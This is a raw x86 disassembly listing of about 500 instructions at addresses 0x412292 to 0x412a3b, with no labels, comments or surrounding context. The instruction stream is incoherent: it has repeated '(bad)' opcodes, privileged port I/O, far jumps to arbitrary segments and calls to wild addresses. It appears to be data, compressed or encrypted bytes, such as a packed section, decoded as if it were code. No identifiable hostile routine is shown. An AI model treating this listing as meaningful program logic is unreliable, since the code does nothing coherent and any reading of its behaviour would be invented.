  412292:	sub    BYTE PTR [ecx+0x4a],ch
  412295:	pop    es
  412296:	inc    edi
  412297:	jnp    0x41224d
  412299:	push   cs
  41229a:	add    eax,0x4f17b8e1
  41229f:	rcl    ah,1
  4122a1:	pop    ds
  4122a2:	lahf   
  4122a3:	fwait
  4122a4:	xchg   DWORD PTR [ebx+edi*4-0x2c5a9fff],eax
  4122ab:	cmp    eax,0x1da501ca
  4122b0:	or     al,0xb2
  4122b2:	call   0xfa51:0x8c414380
  4122b9:	test   BYTE PTR [esi+0x2e],ch
  4122bc:	retf   0xed01
  4122bf:	mov    bl,0x87
  4122c1:	inc    ecx
  4122c2:	mov    bh,0xfa
  4122c4:	fldcw  WORD PTR [ebp+0x84425cf]
  4122ca:	mov    bl,0x71
  4122cc:	fmul   QWORD PTR [eax-0x2f66384c]
  4122d2:	rol    bh,1
  4122d4:	adc    ebp,DWORD PTR [eax]
  4122d6:	push   ebx
  4122d7:	adc    cl,bh
  4122d9:	test   eax,0x2b60c6b1
  4122de:	cmc    
  4122df:	xor    al,0xc3
  4122e1:	jecxz  0x4122ed
  4122e3:	arpl   WORD PTR [ebx],sp
  4122e5:	std    
  4122e6:	xor    al,0x29
  4122e8:	inc    edi
  4122e9:	adc    ebp,edx
  4122eb:	in     al,dx
  4122ec:	or     DWORD PTR [ebx-0x55],esi
  4122ef:	sbb    BYTE PTR [edi],ah
  4122f1:	scas   al,BYTE PTR es:[edi]
  4122f2:	stc    
  4122f3:	in     eax,dx
  4122f4:	xchg   dh,cl
  4122f6:	lods   al,BYTE PTR ds:[esi]
  4122f7:	sub    DWORD PTR [edi+ebx*4],ebx
  4122fa:	mov    bl,0x0
  4122fc:	shr    DWORD PTR [ebp+0x3f],0xe4
  412300:	out    dx,eax
  412301:	gs into 
  412303:	inc    esi
  412304:	mov    ds:0x538292d4,eax
  412309:	and    DWORD PTR [edx],ebp
  41230b:	loopne 0x412351
  41230d:	jae    0x4122f4
  41230f:	daa    
  412310:	or     DWORD PTR [ebp-0x75],ecx
  412313:	mov    dh,0x2d
  412315:	push   esi
  412316:	adc    BYTE PTR [ebx],0xa0
  412319:	pop    esi
  41231a:	in     eax,0x1d
  41231c:	fist   DWORD PTR [ecx-0x38]
  41231f:	out    0x97,al
  412321:	sbb    edi,DWORD PTR [ebp+0x48]
  412324:	jnp    0x4122ae
  412326:	mov    ebp,0xd1c23f76
  41232b:	jmp    0xfc1e47e6
  412330:	pop    edi
  412331:	sbb    al,0x71
  412333:	inc    esi
  412334:	jmp    0x27293e9c
  412339:	retf   
  41233a:	xor    bh,BYTE PTR [ebx]
  41233c:	arpl   bx,bx
  41233e:	pop    ss
  41233f:	cli    
  412340:	sub    ecx,0x2e
  412343:	push   edx
  412344:	out    0x28,eax
  412346:	sub    al,0xfd
  412348:	mov    dh,0xc3
  41234a:	sbb    eax,DWORD PTR [ecx]
  41234c:	or     esi,esi
  41234e:	sbb    al,0x49
  412350:	pop    ss
  412351:	popf   
  412352:	mov    esi,0xd027a881
  412357:	cmp    BYTE PTR [esp+ebp*4-0x694e3dcb],ah
  41235e:	cmp    al,0x35
  412360:	jmp    0xec5138bc
  412365:	cmp    BYTE PTR [eax],al
  412367:	data16 jne 0x41236d
  41236a:	pusha  
  41236b:	jmp    DWORD PTR [edx+0x4024dc5e]
  412371:	outs   dx,DWORD PTR ds:[esi]
  412372:	push   ss
  412373:	inc    ebx
  412374:	jo     0x412324
  412376:	bound  edx,QWORD PTR [eax]
  412378:	and    BYTE PTR [eax],ah
  41237a:	lods   al,BYTE PTR ds:[esi]
  41237b:	pop    ebp
  41237c:	(bad)  
  41237d:	out    dx,eax
  41237e:	cmp    al,0x5
  412380:	call   0x257ec2ff
  412385:	sbb    eax,DWORD PTR [edx+edx*4-0x20]
  412389:	pop    eax
  41238a:	push   edx
  41238b:	or     ebp,DWORD PTR [ebx+0x7a]
  41238e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41238f:	mov    eax,DWORD PTR [ebx+ecx*8-0x74]
  412393:	xchg   edi,eax
  412394:	dec    ebp
  412395:	aaa    
  412396:	jbe    0x412417
  412398:	pop    edx
  412399:	jl     0x41240b
  41239b:	mov    esi,0xd5e28e18
  4123a0:	imul   ecx,DWORD PTR [ebx],0x54ace999
  4123a6:	dec    ebp
  4123a7:	retf   0x27f8
  4123aa:	xlat   BYTE PTR ds:[ebx]
  4123ab:	xor    dl,0xb3
  4123ae:	es xchg ecx,eax
  4123b0:	adc    ah,BYTE PTR gs:[eax]
  4123b3:	in     eax,0x60
  4123b5:	add    DWORD PTR [esi],edx
  4123b7:	xor    al,0x98
  4123b9:	sub    esi,DWORD PTR [eax+eiz*2+0x10ea4b60]
  4123c0:	adc    ecx,eax
  4123c2:	pop    ss
  4123c3:	push   ds
  4123c4:	call   0x2891c0b
  4123c9:	jmp    0x412413
  4123cb:	sar    DWORD PTR [ebx],0x14
  4123ce:	jno    0x4123f9
  4123d0:	popa   
  4123d1:	ins    BYTE PTR es:[edi],dx
  4123d2:	xchg   edi,eax
  4123d3:	push   0xffffff81
  4123d5:	icebp  
  4123d6:	inc    edx
  4123d7:	call   0x98a4745a
  4123dc:	mov    bl,0x17
  4123de:	jne    0x4123bb
  4123e0:	je     0x412450
  4123e2:	or     BYTE PTR [ecx-0x580db8dd],dl
  4123e8:	push   esi
  4123e9:	ins    DWORD PTR es:[edi],dx
  4123ea:	fcomip st,st(4)
  4123ec:	sub    dl,BYTE PTR [ecx+ebp*4-0x73]
  4123f0:	push   esi
  4123f1:	push   ss
  4123f2:	(bad)  
  4123f4:	sbb    al,0x9d
  4123f6:	mov    ah,0xf3
  4123f8:	inc    ebp
  4123f9:	test   DWORD PTR [edi+eax*4],eax
  4123fc:	jo     0x4123a2
  4123fe:	push   0x19
  412400:	dec    ebx
  412401:	test   BYTE PTR [ecx-0x61],al
  412404:	push   ebx
  412405:	cmp    ebp,edi
  412407:	aam    0x88
  412409:	and    DWORD PTR [edi+ecx*4],esi
  41240c:	lock (bad) 
  41240e:	dec    ecx
  41240f:	shr    DWORD PTR [ebx+0x2e],1
  412412:	add    DWORD PTR [ebx+0x5d],esp
  412415:	sbb    eax,0x6900fe57
  41241a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41241b:	sub    DWORD PTR [ebp+0x6b],esi
  41241e:	sub    DWORD PTR [eax+0x72],ebx
  412421:	dec    ecx
  412422:	add    eax,0xf12de860
  412427:	test   esi,0x7928e591
  41242d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41242e:	daa    
  41242f:	jne    0x4123bc
  412431:	sbb    al,0x7
  412433:	xor    cl,dh
  412435:	push   ebp
  412436:	jmp    0x55e88c4
  41243b:	stc    
  41243c:	push   ss
  41243d:	sub    DWORD PTR [eax+0x171e65],edi
  412443:	fwait
  412444:	cmp    dl,BYTE PTR [eax]
  412446:	popf   
  412447:	fisubr DWORD PTR [esi-0x19]
  41244a:	jg     0x412445
  41244c:	inc    ecx
  41244d:	or     al,0xc
  41244f:	cmc    
  412450:	call   0x9a8882d6
  412455:	dec    edi
  412456:	(bad)  
  412457:	jmp    0x92b3:0x610ea3be
  41245e:	clc    
  41245f:	scas   eax,DWORD PTR es:[edi]
  412460:	sub    DWORD PTR ds:[ebp+edx*2+0x43],edx
  412465:	xor    al,0x2f
  412467:	ret    
  412468:	push   esp
  412469:	mov    eax,edi
  41246b:	xlat   BYTE PTR ds:[ebx]
  41246c:	call   0x5182:0x9210e26d
  412473:	inc    ebp
  412474:	push   ds
  412475:	sbb    BYTE PTR [edx+0x4b],bh
  412478:	mov    bl,0xc8
  41247a:	pop    ebx
  41247b:	sub    al,0xbe
  41247d:	nop
  41247e:	enter  0xba7d,0x1
  412482:	mov    ah,0xfe
  412484:	inc    eax
  412485:	dec    ecx
  412486:	xor    DWORD PTR [ebx],0x9f359886
  41248c:	add    DWORD PTR [eax-0x122e3487],edi
  412492:	pop    eax
  412493:	fnstcw WORD PTR [edi-0x3c]
  412496:	lods   al,BYTE PTR ds:[esi]
  412497:	outs   dx,BYTE PTR ds:[esi]
  412498:	retf   0x34ed
  41249b:	jle    0x412463
  41249d:	loope  0x412449
  41249f:	sub    DWORD PTR [eax-0x401698c7],0xa9d1aae1
  4124a9:	and    edx,ecx
  4124ab:	out    dx,eax
  4124ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ad:	push   cs
  4124ae:	sbb    BYTE PTR [esi],cl
  4124b0:	fild   WORD PTR [eax+0x4829e1d3]
  4124b6:	ins    BYTE PTR es:[edi],dx
  4124b7:	fld    QWORD PTR [ebx-0x7a]
  4124ba:	jmp    0x7da1:0xceb450d9
  4124c1:	push   edx
  4124c2:	fdivrp st(3),st
  4124c4:	test   DWORD PTR [edx-0x59],ecx
  4124c7:	outs   dx,BYTE PTR ds:[esi]
  4124c8:	fidivr WORD PTR [ebp+0x2fac5091]
  4124ce:	or     DWORD PTR [edi],ecx
  4124d0:	lods   eax,DWORD PTR gs:[esi]
  4124d2:	pop    edi
  4124d3:	xchg   edx,eax
  4124d4:	cmp    eax,0x9db4c47a
  4124d9:	sub    ecx,ebx
  4124db:	(bad)  [edi-0xf418155]
  4124e1:	retf   0x94bd
  4124e4:	jmp    0x412562
  4124e6:	scas   al,BYTE PTR es:[edi]
  4124e7:	or     BYTE PTR [edi+0x5e],0x20
  4124eb:	jne    0x4124e3
  4124ed:	imul   edi,esi,0x9922a382
  4124f3:	push   ss
  4124f4:	scas   eax,DWORD PTR es:[edi]
  4124f5:	cli    
  4124f6:	pop    ds
  4124f7:	or     edx,ebx
  4124f9:	pop    esi
  4124fa:	mov    esp,0x43c777cb
  4124ff:	push   es
  412500:	(bad)  
  412501:	fisubr DWORD PTR [eax-0x2e]
  412504:	xchg   edi,eax
  412505:	mov    ds:0xa4e466a2,al
  41250a:	dec    eax
  41250b:	data16 cld 
  41250d:	dec    ebx
  41250e:	mov    ebp,ebx
  412510:	cmc    
  412511:	repz fild WORD PTR [ebx-0x515157e1]
  412518:	mov    esi,DWORD PTR [ebx]
  41251a:	adc    dh,BYTE PTR [ebx]
  41251c:	shl    BYTE PTR [esi-0x7b],cl
  41251f:	sub    edx,DWORD PTR [esi]
  412521:	ss scas al,BYTE PTR es:[edi]
  412523:	xchg   bh,cl
  412525:	das    
  412526:	pop    ds
  412527:	mov    edx,0xb3e7b962
  41252c:	mov    edx,0x2c84e955
  412531:	ror    DWORD PTR [esi+eiz*1],0x45
  412535:	add    al,bl
  412537:	imul   edi,DWORD PTR [edi],0x70
  41253a:	data16 aad 0xbd
  41253d:	stos   BYTE PTR es:[edi],al
  41253e:	and    al,0x68
  412540:	lea    esi,[ecx]
  412542:	mov    esi,0x801da2e1
  412547:	test   BYTE PTR [ebp+esi*1+0x1e],dl
  41254b:	push   edx
  41254c:	aam    0xd
  41254e:	popa   
  41254f:	pop    esi
  412550:	out    dx,al
  412551:	sbb    al,0x1b
  412553:	les    eax,FWORD PTR [edx]
  412555:	xor    DWORD PTR [esi],esp
  412557:	mov    BYTE PTR [edi],dh
  412559:	cmp    al,0xbf
  41255b:	(bad)  
  41255c:	call   0x5305652
  412561:	int    0x0
  412563:	in     eax,0x98
  412565:	shl    DWORD PTR [esi-0x4],cl
  412568:	retf   
  412569:	addr16 inc esp
  41256b:	cli    
  41256c:	cmp    eax,0x9dc4f487
  412571:	outs   dx,BYTE PTR ds:[esi]
  412572:	mov    cl,0x3
  412574:	je     0x412502
  412576:	or     edx,ecx
  412578:	jne    0x41256b
  41257a:	jge    0x4125d1
  41257c:	mov    ch,0xd1
  41257e:	sub    bh,al
  412580:	shl    BYTE PTR [ecx+0x4b390b9f],0x1a
  412587:	shl    dl,0x19
  41258a:	jle    0x412514
  41258c:	and    edx,0x3d
  41258f:	test   DWORD PTR [ebx],edi
  412591:	lods   eax,DWORD PTR ds:[esi]
  412592:	faddp  st(0),st
  412594:	pop    ss
  412595:	outs   dx,DWORD PTR ds:[esi]
  412596:	(bad)  
  412597:	add    BYTE PTR [ebp+0x50],dl
  41259a:	(bad)  
  41259b:	cmc    
  41259c:	or     ch,BYTE PTR [ecx+0x7a5401a1]
  4125a2:	mov    ch,0x31
  4125a4:	sti    
  4125a5:	iret   
  4125a6:	fdivr  QWORD PTR [ecx+0x77]
  4125a9:	push   0xffffffb6
  4125ab:	aam    0xb6
  4125ad:	push   ebx
  4125ae:	sahf   
  4125af:	sbb    eax,0x728788b9
  4125b4:	es ins DWORD PTR es:[edi],dx
  4125b6:	pop    ecx
  4125b7:	mov    ebx,0x272fc832
  4125bc:	cmp    BYTE PTR [esi],bh
  4125be:	xchg   ebx,eax
  4125bf:	mov    bh,0x3e
  4125c1:	popf   
  4125c2:	test   BYTE PTR [edx-0x554b6e9b],0xa4
  4125c9:	test   al,0xf9
  4125cb:	imul   eax,DWORD PTR [ecx+ecx*2+0x71],0xffffffc9
  4125d0:	mov    ds:0x1e53b3a8,eax
  4125d5:	and    BYTE PTR [ebx],bh
  4125d7:	push   edx
  4125d8:	pop    ecx
  4125d9:	fadd   DWORD PTR [ecx-0x61]
  4125dc:	dec    ebp
  4125dd:	mov    esi,0xf9f72eec
  4125e2:	cmc    
  4125e3:	in     eax,dx
  4125e4:	mov    ebp,0xf3129fdd
  4125e9:	and    eax,0x300b870e
  4125ee:	outs   dx,BYTE PTR ds:[esi]
  4125ef:	fbstp  TBYTE PTR [edx]
  4125f1:	aaa    
  4125f2:	mov    eax,ds:0xf8ce0f6b
  4125f7:	sub    eax,0x5fc6c2fa
  4125fc:	sbb    DWORD PTR [ebx+0x42],eax
  4125ff:	ja     0x4125d1
  412601:	iret   
  412602:	inc    ebp
  412603:	xchg   edi,eax
  412604:	adc    eax,0x3ec50bcb
  41260a:	xchg   ebp,ebp
  41260c:	fistp  DWORD PTR [ebx-0x16]
  41260f:	and    dh,BYTE PTR [ebx]
  412611:	fs sub eax,0xfccefc9e
  412617:	clc    
  412618:	inc    ecx
  412619:	xor    al,0xb8
  41261b:	std    
  41261c:	xor    bl,BYTE PTR [esi-0x80]
  41261f:	or     al,0x39
  412621:	inc    esi
  412622:	cld    
  412623:	fldenv [ecx+0x13]
  412626:	jne    0x41265e
  412628:	inc    ecx
  412629:	mov    ds:0x39073a22,al
  41262e:	pop    ebx
  41262f:	fs pop ebp
  412631:	fidivr WORD PTR [ebp-0x1]
  412634:	clc    
  412635:	nop
  412636:	in     al,0xce
  412638:	mov    al,BYTE PTR [ecx+0x6a]
  41263b:	clc    
  41263c:	cmp    eax,0x70741c01
  412641:	jno    0x412635
  412643:	inc    ecx
  412644:	xchg   ecx,eax
  412645:	mov    eax,0xdfd60cc9
  41264a:	adc    esp,DWORD PTR [esi+ecx*2-0x49]
  41264e:	inc    eax
  41264f:	xchg   ebp,eax
  412650:	mov    edi,0xab9a0c93
  412655:	mov    edx,edi
  412657:	add    ah,BYTE PTR [edx+0x2d40085d]
  41265d:	xchg   dl,al
  41265f:	push   esp
  412660:	xor    ebp,ebp
  412662:	mov    dh,0xe7
  412664:	mov    eax,ds:0x6814217d
  412669:	pop    edx
  41266a:	cwde   
  41266b:	or     ebp,DWORD PTR [ebp-0x3a]
  41266e:	dec    esi
  41266f:	test   cl,0xde
  412672:	sbb    BYTE PTR [ebp+0x6a],0x7a
  412676:	mov    ss,WORD PTR [edx]
  412678:	ret    
  412679:	call   0x53c71ab6
  41267e:	jecxz  0x41269d
  412680:	pop    edi
  412681:	jp     0x412673
  412683:	lock inc esi
  412685:	fsubr  DWORD PTR [ebx+0x42]
  412688:	call   0x5965df69
  41268d:	test   ebx,0xb880c9ff
  412693:	outs   dx,DWORD PTR ds:[esi]
  412694:	stos   DWORD PTR es:[edi],eax
  412695:	int    0x12
  412697:	out    dx,al
  412698:	jno    0x4126eb
  41269a:	jo     0x41264f
  41269c:	das    
  41269d:	fdivr  QWORD PTR [eax+edi*2-0x74]
  4126a1:	sub    ch,BYTE PTR [eax]
  4126a3:	xor    DWORD PTR [ecx+edi*8],ebx
  4126a6:	int3   
  4126a7:	dec    eax
  4126a8:	mov    edx,0x8ba488e8
  4126ad:	aad    0xd9
  4126af:	fs jmp 0x30cd:0xcaf93452
  4126b7:	mov    esi,0x4f127087
  4126bc:	aad    0xdf
  4126be:	loopne 0x41270f
  4126c0:	xchg   ebx,eax
  4126c1:	pusha  
  4126c2:	pusha  
  4126c3:	mov    BYTE PTR ds:0x856d69ad,bl
  4126c9:	fsub   st(2),st
  4126cb:	mov    dl,0x35
  4126cd:	xor    edi,0xffffffc2
  4126d0:	jo     0x4126e6
  4126d2:	out    dx,eax
  4126d3:	push   es
  4126d4:	loop   0x41270b
  4126d6:	push   ebx
  4126d7:	imul   ecx,ebx,0x40
  4126da:	push   eax
  4126db:	in     al,0x1a
  4126dd:	lds    esi,FWORD PTR [ebx+0x5591a693]
  4126e3:	push   ss
  4126e4:	cwde   
  4126e5:	mov    bl,BYTE PTR [edi+0x55]
  4126e8:	lock fild QWORD PTR [edi]
  4126eb:	jne    0x4126e6
  4126ed:	push   ebx
  4126ee:	mov    esp,0x333739cc
  4126f3:	leave  
  4126f4:	inc    ebx
  4126f5:	sub    al,0xbd
  4126f7:	pop    esp
  4126f8:	outs   dx,DWORD PTR ds:[esi]
  4126f9:	cmp    DWORD PTR [ebx],esi
  4126fb:	dec    ebp
  4126fc:	xor    BYTE PTR ds:0x10e3216f,al
  412702:	gs sti 
  412704:	out    dx,eax
  412705:	in     al,0x31
  412707:	jns    0x412709
  412709:	mov    edi,0xdd089b7b
  41270e:	mov    edi,DWORD PTR [esi]
  412710:	sub    bl,ah
  412712:	sbb    DWORD PTR [eax-0x18],0x51
  412716:	(bad)  
  412717:	mov    al,ds:0xf70c98d3
  41271c:	xchg   BYTE PTR [ebx+0x46],bl
  41271f:	dec    ecx
  412720:	push   esi
  412721:	jno    0x41274c
  412723:	arpl   WORD PTR [edx],dx
  412725:	fadd   st(7),st
  412727:	test   DWORD PTR [ebp-0x364ebfda],edi
  41272d:	sbb    edx,DWORD PTR [ebp+0x3c794661]
  412733:	bound  eax,QWORD PTR [eax+0x2f]
  412736:	xor    edi,eax
  412738:	fisttp DWORD PTR ds:0xe3a25d8
  41273e:	xchg   esp,eax
  41273f:	jnp    0x41279a
  412741:	es inc edx
  412743:	imul   eax,DWORD PTR [edx-0x44],0x20
  412747:	aaa    
  412748:	mov    cl,0xd9
  41274a:	scas   al,BYTE PTR es:[edi]
  41274b:	sti    
  41274c:	mov    ebp,0x6af156b5
  412751:	add    ebx,eax
  412753:	repz push ds
  412755:	sti    
  412756:	add    al,0x0
  412758:	pop    ebp
  412759:	adc    DWORD PTR [bx+di-0x41],0x53
  41275e:	fnstenv [edx+ebx*1]
  412761:	jae    0x41272a
  412763:	in     eax,dx
  412764:	or     BYTE PTR fs:[esp+edx*8-0x2e],dh
  412769:	into   
  41276a:	or     ebx,DWORD PTR [edx+eax*2+0x5a59a8a4]
  412771:	enter  0x7915,0x5e
  412775:	cld    
  412776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412777:	std    
  412778:	push   edi
  412779:	mov    ebx,0xc7a610fd
  41277e:	pop    ecx
  41277f:	inc    edi
  412780:	int    0x23
  412782:	call   ebx
  412784:	jb     0x4127dc
  412786:	loope  0x412797
  412788:	jmp    0x4127dd
  41278a:	xor    BYTE PTR [edx+0x3a],bl
  41278d:	cdq    
  41278e:	sub    bh,BYTE PTR [ecx+0x48]
  412791:	pop    ebx
  412792:	pusha  
  412793:	dec    eax
  412794:	(bad)  
  412795:	popa   
  412796:	into   
  412797:	(bad)  
  412798:	stc    
  412799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279a:	pop    ebx
  41279b:	cmp    al,bh
  41279d:	dec    ecx
  41279e:	test   al,0x83
  4127a0:	imul   eax,DWORD PTR fs:[ecx+0x9],0x69effc02
  4127a8:	adc    bh,BYTE PTR [ebx]
  4127aa:	cmp    al,0xeb
  4127ac:	push   0x483f5653
  4127b1:	icebp  
  4127b2:	(bad)  
  4127b3:	mov    eax,ds:0xb4b5dc84
  4127b8:	bound  eax,QWORD PTR [esi-0x4e8458cf]
  4127be:	adc    ah,bl
  4127c0:	add    BYTE PTR [eax+0x43fc3c0a],dh
  4127c6:	pusha  
  4127c7:	xchg   esi,eax
  4127c8:	mov    edx,0x17b7ed89
  4127cd:	arpl   WORD PTR ds:0xc911ef2a,di
  4127d3:	dec    eax
  4127d4:	inc    edx
  4127d5:	hlt    
  4127d6:	loopne 0x4127cd
  4127d8:	mov    ds:0x951cc72d,eax
  4127dd:	push   ebx
  4127de:	push   0x40
  4127e0:	sub    ebp,DWORD PTR [eax-0x33062644]
  4127e6:	aad    0x6b
  4127e8:	cli    
  4127e9:	frstor [ecx+0x21fbbe4e]
  4127ef:	stos   DWORD PTR es:[edi],eax
  4127f0:	mov    ah,0xaf
  4127f2:	enter  0x8f43,0x68
  4127f6:	clc    
  4127f7:	inc    edi
  4127f8:	call   FWORD PTR [ecx-0x2a4073ac]
  4127fe:	push   ecx
  4127ff:	ins    DWORD PTR es:[edi],dx
  412800:	mov    ah,0x58
  412802:	and    al,0xf6
  412804:	repnz push ecx
  412806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412807:	xchg   esi,eax
  412808:	jp     0x4127e1
  41280a:	sub    al,cl
  41280c:	fwait
  41280d:	ins    BYTE PTR es:[edi],dx
  41280e:	inc    ecx
  41280f:	adc    dh,dl
  412811:	sti    
  412812:	push   0x6096ea14
  412817:	xor    eax,0x86e0029c
  41281c:	pop    fs
  41281e:	fnstsw WORD PTR [eax-0x67c40ecf]
  412824:	jbe    0x412891
  412826:	xlat   BYTE PTR ds:[ebx]
  412827:	call   0xe18f:0x604a4362
  41282e:	cmp    edi,DWORD PTR [edi-0x74]
  412831:	or     dh,BYTE PTR [ebx-0x40]
  412834:	cmp    edi,DWORD PTR [edx]
  412836:	pusha  
  412837:	in     al,0x5
  412839:	mov    cl,0x92
  41283b:	xchg   esp,eax
  41283c:	mov    edi,0xc5ec5f0e
  412841:	je     0x4127da
  412843:	fidiv  DWORD PTR [edi]
  412845:	in     eax,0x5e
  412847:	inc    ecx
  412848:	shr    esi,1
  41284a:	out    dx,al
  41284b:	add    dl,dh
  41284d:	and    edi,esp
  41284f:	push   edx
  412850:	push   es
  412851:	rcr    BYTE PTR [ebp+0x7ff56853],0x4b
  412858:	mov    bl,bh
  41285a:	add    eax,0x16e680e2
  41285f:	adc    esp,eax
  412861:	jmp    0x2135:0x3d2552cd
  412868:	and    edx,DWORD PTR [eax]
  41286a:	gs fwait
  41286c:	leave  
  41286d:	xchg   edx,eax
  41286e:	push   es
  41286f:	scas   eax,DWORD PTR es:[edi]
  412870:	test   al,0x73
  412872:	cmp    BYTE PTR [edi+0x65],bh
  412875:	jmp    0xdaad3db0
  41287a:	(bad)  [esi]
  41287c:	adc    ebp,esi
  41287e:	(bad)  
  41287f:	mov    es,WORD PTR [ebp+0x61]
  412882:	hlt    
  412883:	and    DWORD PTR [eax+0x18],ebx
  412886:	sub    eax,eax
  412888:	iret   
  412889:	jmp    0x4128af
  41288b:	test   BYTE PTR [ebx-0x4],al
  41288e:	mov    al,0x2c
  412890:	push   ebp
  412891:	sbb    BYTE PTR [esi+0x2f5ffcd7],dl
  412897:	mov    cs,WORD PTR [ecx+0x29b8e47c]
  41289d:	xchg   edi,eax
  41289e:	sbb    ebp,DWORD PTR [ecx-0x24]
  4128a1:	mov    ecx,0xfae4b7d2
  4128a6:	xchg   esi,eax
  4128a7:	xchg   esi,eax
  4128a8:	inc    edx
  4128a9:	retf   
  4128aa:	sahf   
  4128ab:	xor    bh,0x6b
  4128ae:	mov    ch,0xf8
  4128b0:	or     al,BYTE PTR [edx-0x27d0dd62]
  4128b6:	dec    esp
  4128b7:	adc    DWORD PTR [ebx],edi
  4128b9:	lahf   
  4128ba:	cld    
  4128bb:	pop    ebx
  4128bc:	popa   
  4128bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128be:	sub    DWORD PTR [eax+0x3af86d30],0x57a93b91
  4128c8:	ffree  st(5)
  4128ca:	xchg   ebp,eax
  4128cb:	outs   dx,BYTE PTR ds:[esi]
  4128cc:	add    al,0x95
  4128ce:	cmc    
  4128cf:	stc    
  4128d0:	sbb    DWORD PTR [edi+0x7b9faa85],0x2a
  4128d7:	mov    ecx,0xe26e6360
  4128dc:	push   ebx
  4128dd:	jae    0x4128a0
  4128df:	sbb    eax,0x54307b26
  4128e4:	inc    ebp
  4128e5:	cli    
  4128e6:	enter  0x8a68,0x76
  4128ea:	xor    DWORD PTR [edi+0x1b233e1e],ebp
  4128f0:	and    edx,ebp
  4128f2:	mov    edi,0x7390daa7
  4128f7:	mov    BYTE PTR [ebx+0x8],ch
  4128fa:	adc    esi,DWORD PTR [edi]
  4128fc:	cwde   
  4128fd:	cdq    
  4128fe:	call   0xb659:0xe0035a45
  412905:	xchg   ebx,eax
  412906:	dec    ecx
  412907:	cmp    DWORD PTR [edi],ebp
  412909:	lock out 0xd6,eax
  41290c:	popf   
  41290d:	adc    DWORD PTR [ebx],edi
  41290f:	mov    bh,0x46
  412911:	inc    BYTE PTR [ebx+0x4d18d114]
  412917:	jno    0x412959
  412919:	shl    BYTE PTR [ecx+0x7e],0xed
  41291d:	test   DWORD PTR [ecx+0x22],edi
  412920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412921:	mov    dh,0x27
  412923:	pop    ebp
  412924:	push   0xd1f0533f
  412929:	xchg   edi,eax
  41292a:	mov    ds:0x63d933be,al
  41292f:	jb     0x41294e
  412931:	aad    0x5b
  412933:	in     al,0xcc
  412935:	xchg   ebp,eax
  412936:	add    al,0x44
  412938:	cdq    
  412939:	int3   
  41293a:	nop
  41293b:	mov    cs,WORD PTR [edi-0x379dc605]
  412941:	enter  0x77e9,0xbd
  412945:	jno    0x412933
  412947:	lock in al,0xb5
  41294a:	sbb    edi,DWORD PTR [esi+0x69]
  41294d:	test   al,0xba
  41294f:	xor    al,0x18
  412951:	adc    ebp,DWORD PTR [esi]
  412953:	retf   
  412954:	ror    DWORD PTR [eax-0x43],0xd
  412958:	xchg   esi,eax
  412959:	out    dx,al
  41295a:	add    DWORD PTR [eax+0x635f24c5],ebp
  412960:	ja     0x4129cc
  412962:	xchg   edx,eax
  412963:	xor    cl,BYTE PTR [esi]
  412965:	jmp    0x2e1e:0x13d582ca
  41296c:	cli    
  41296d:	iret   
  41296e:	xchg   edi,eax
  41296f:	(bad)  
  412970:	xor    BYTE PTR [esi-0x4866a5c8],cl
  412976:	jb     0x41293d
  412978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412979:	mov    WORD PTR [esi],fs
  41297b:	ins    BYTE PTR es:[edi],dx
  41297c:	xchg   edi,eax
  41297d:	das    
  41297e:	fs iret 
  412980:	xor    esi,DWORD PTR [edx]
  412982:	dec    edi
  412983:	mov    ch,BYTE PTR [ebp-0xa845011]
  412989:	mov    ch,0x79
  41298b:	(bad)  
  41298d:	out    0xeb,eax
  41298f:	test   BYTE PTR [ebx],dh
  412991:	ret    
  412992:	out    dx,eax
  412993:	lods   eax,DWORD PTR ds:[esi]
  412994:	sets   BYTE PTR [edi-0x6d]
  412998:	arpl   WORD PTR [ecx],di
  41299a:	jle    0x41291d
  41299c:	mov    al,0x41
  41299e:	sbb    BYTE PTR [esi],ch
  4129a0:	mov    dl,0x64
  4129a2:	mov    ah,0x20
  4129a4:	ins    BYTE PTR es:[edi],dx
  4129a5:	mov    dh,0x2d
  4129a7:	shl    BYTE PTR [ebp-0x48],1
  4129aa:	in     al,0xe4
  4129ac:	popa   
  4129ad:	inc    ebp
  4129ae:	or     eax,0x79a78192
  4129b3:	push   cs
  4129b4:	ret    
  4129b5:	adc    DWORD PTR [edx+0x3ff8bd0f],ebx
  4129bb:	call   0x37c2:0x767053a1
  4129c2:	popf   
  4129c3:	xchg   al,dh
  4129c5:	imul   eax,DWORD PTR [ebx],0x2c73a9ee
  4129cb:	and    DWORD PTR [esi],0xffffff9f
  4129ce:	mov    BYTE PTR [edx],al
  4129d0:	rol    ebx,cl
  4129d2:	mov    dh,0x76
  4129d4:	mov    bh,0x74
  4129d6:	mov    al,ds:0x73088c8f
  4129db:	jmp    0x4129f8
  4129dd:	and    DWORD PTR [ebx+0x440a53d7],0x5a499d9
  4129e7:	xchg   edx,eax
  4129e8:	leave  
  4129e9:	aam    0xa0
  4129eb:	iret   
  4129ec:	mov    ds,edi
  4129ee:	mov    esp,0xca570574
  4129f3:	cs push edx
  4129f5:	adc    dh,dl
  4129f7:	sti    
  4129f8:	jg     0x412a19
  4129fa:	inc    esi
  4129fb:	sti    
  4129fc:	fmul   QWORD PTR [edi-0x51]
  4129ff:	inc    eax
  412a00:	push   edx
  412a01:	sbb    BYTE PTR [eax],dl
  412a03:	sbb    BYTE PTR [edx],dl
  412a05:	cmp    BYTE PTR [edi],al
  412a07:	jnp    0x412a52
  412a09:	daa    
  412a0a:	mov    al,dl
  412a0c:	xor    al,BYTE PTR [ecx]
  412a0e:	cdq    
  412a0f:	les    edi,FWORD PTR [edx-0x4c]
  412a12:	retf   0x8860
  412a15:	popa   
  412a16:	or     dh,BYTE PTR [edi+0x6423f160]
  412a1c:	mov    ebx,0x75e36176
  412a21:	out    0x65,al
  412a23:	sub    bh,BYTE PTR [ecx+0x43]
  412a26:	sar    esi,1
  412a28:	int3   
  412a29:	pop    es
  412a2a:	mov    esi,0x687d8231
  412a2f:	call   0x9dd90699
  412a34:	ror    DWORD PTR [ebp+0x3d60b81a],0x3f
  412a3b:	add    BYTE PTR [eax+0x41],bh
